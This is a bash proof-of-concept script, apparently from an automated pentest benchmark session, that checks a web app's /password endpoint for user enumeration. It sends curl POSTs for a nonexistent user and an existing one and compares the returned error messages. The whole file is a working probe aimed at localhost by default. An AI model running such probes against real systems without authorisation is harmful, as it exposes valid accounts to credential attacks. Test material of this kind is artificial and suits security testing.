#!/bin/bash
# POC: Demonstrates user enumeration via differential error messages on the password reset endpoint. Tests both non-existent users and existing users to show distinct error responses.
# Target: ./repo
# Created: 2025-11-07T18:43:53.471Z
# Session: benchmark-XBEN-001-24-mhp6yrzj

# User Enumeration POC - Verbose Error Messages
# This script demonstrates how differential error messages enable user enumeration

TARGET_HOST="${1:-localhost:8082}"
BASE_URL="http://$TARGET_HOST"
PASSWORD_ENDPOINT="/password"

echo "=========================================="
echo "User Enumeration via Verbose Error Messages POC"
echo "=========================================="
echo "Target: $BASE_URL"
echo ""

# Test 1: Non-existent user
echo "[TEST 1] Testing non-existent user (fakeuser999)"
echo "Command: curl -s -i -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'password=test' $BASE_URL$PASSWORD_ENDPOINT/fakeuser999"
echo ""
RESPONSE_1=$(curl -s -i -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "password=test" "$BASE_URL$PASSWORD_ENDPOINT/fakeuser999")
echo "$RESPONSE_1" | head -20
echo ""
ERROR_MSG_1=$(echo "$RESPONSE_1" | grep -oP 'error=[^&\s]*' | head -1)
echo "Extracted error: $ERROR_MSG_1"
echo ""

# Test 2: Existing user with wrong password
echo "[TEST 2] Testing existing user (test) with wrong password"
echo "Command: curl -s -i -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'password=wrongpass' $BASE_URL$PASSWORD_ENDPOINT/test"
echo ""
RESPONSE_2=$(curl -s -i -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "password=wrongpass" "$BASE_URL$PASSWORD_ENDPOINT/test")
echo "$RESPONSE_2" | head -20
echo ""
ERROR_MSG_2=$(echo "$RESPONSE_2" | grep -oP 'error=[^&\s]*' | head -1)
echo "Extracted error: $ERROR_MSG_2"
echo ""

# Test 3: Comparison
echo "[ANALYSIS] Error Message Comparison"
echo "=========================================="
echo "Non-existent user error: $ERROR_MSG_1"
echo "Existing user error:     $ERROR_MSG_2"
echo ""

if [ "$ERROR_MSG_1" != "$ERROR_MSG_2" ]; then
    echo "✓ VULNERABILITY CONFIRMED: Error messages are different"
    echo "  This allows attackers to determine if a user account exists"
    echo ""
    echo "  Error message for non-existent user: $(echo $ERROR_MSG_1 | sed 's/error=//')"
    echo "  Error message for wrong password: $(echo $ERROR_MSG_2 | sed 's/error=//')"
    exit 0
else
    echo "✗ No vulnerability detected: Error messages are identical (generic)"
    exit 1
fi